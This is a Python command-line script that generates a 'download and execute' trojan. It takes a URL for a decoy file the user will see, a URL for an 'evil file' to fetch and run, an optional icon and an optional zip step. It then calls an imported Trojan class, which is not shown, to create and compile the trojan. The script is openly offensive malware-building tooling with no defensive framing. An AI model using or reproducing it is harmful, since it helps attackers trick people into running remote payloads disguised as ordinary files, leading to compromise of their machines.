#!/usr/bin/env python

import argparse
from Trojan import *

parser = argparse.ArgumentParser(description='Generate a "download and execute" trojan with the given files.')
parser.add_argument('-f', '--front-file', required=True, nargs=1, dest='front_file_url', help='Direct URL to file that the user will see.')
parser.add_argument('-e', '--evil-file', required=True, nargs=1, dest='evil_file_url', help='Direct URL to the evil file file.')
parser.add_argument('-o', '--out-file', required=True, nargs=1, dest='out_file_path', help='Location to store the result.')
parser.add_argument('-i', '--icon', required=False, nargs=1, dest='icon_path', help='Trojan icon.', default=None)
parser.add_argument('-z', '--zip', required=False, dest='zip', help='Zip trojan?', action="store_true", default=False)
args= parser.parse_args()

trojan = Trojan(args.front_file_url[0], args.evil_file_url[0], args.icon_path, args.out_file_path[0])
trojan.create()
trojan.compile()

if args.zip: 
	trojan.zip(args.out_file_path)
